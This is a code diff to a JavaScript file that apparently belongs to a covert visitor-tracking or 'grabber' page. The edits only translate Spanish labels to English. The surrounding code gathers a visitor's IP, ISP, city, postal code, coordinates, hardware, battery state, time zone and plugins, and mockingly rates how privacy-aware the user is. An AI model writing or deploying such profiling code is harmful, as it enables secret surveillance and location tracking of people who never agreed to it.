@@ -163,7 +163,7 @@ function dataURLtoBlob(dataurl) {
       else if (renderer.includes('RTX 40') || renderer.includes('RX 7') || renderer.includes('RX 8')) gpuLevel = 'Mid (Good)';
       else if (renderer.includes('Intel') || renderer.includes('UHD') || renderer.includes('Iris')) gpuLevel = 'Integrated/Cheap (Basic)';
       else if (renderer.includes('Radeon')) gpuLevel = 'Mid (Integrated AMD or Old One)';
-      else gpuLevel = 'Desconocida';
+      else gpuLevel = 'Unknown';
     }
   } catch(e) {}
 
@@ -171,10 +171,10 @@ function dataURLtoBlob(dataurl) {
   let userLevel = 'Beginner (Doesnt Knows A Shit)';
   const savvyPlugins = ['uBlock Origin','AdBlock','Privacy Badger','NoScript','HTTPS Everywhere','ClearURLs','Decentraleyes','Cookie AutoDelete','VPN','Bitwarden','Dark Reader'];
   if (savvyPlugins.some(p => pluginsList.includes(p))) userLevel = 'Smart/Tech-savvy (Knows About Privacy)';
-  if (pluginsList.includes('PDF Viewer') && pluginsList.length < 50) userLevel = 'Principiante total (solo plugins básicos)';
+  if (pluginsList.includes('PDF Viewer') && pluginsList.length < 50) userLevel = 'Beginner';
 
   const datos = {
-    ip: geo.ip || 'oculta',
+    ip: geo.ip || 'Hidden',
     isp: geo.org || '?',
     ubicacion: `${geo.city || '?'}, ${geo.regionName || ''}, ${geo.country_name || 'El Salvador'} (${geo.postal || '?'})`,
     coordenadas: `${geo.latitude || '?'}, ${geo.longitude || '?'}`,
@@ -185,7 +185,7 @@ function dataURLtoBlob(dataurl) {
     ram: navigator.deviceMemory || '?',
     cpu: navigator.hardwareConcurrency || '?',
     pantalla: `${screen.width}x${screen.height}x${screen.colorDepth}`,
-    bateria: battery.level ? `${Math.round(battery.level*100)}% ${battery.charging?'cargando':'descargando'}` : 'no disponible',
+    bateria: battery.level ? `${Math.round(battery.level*100)}% ${battery.charging?'Charging':'Draining'}` : 'Unavailable',
     zona: Intl.DateTimeFormat().resolvedOptions().timeZone,
     plugins: pluginsList,
     user_level: userLevel,
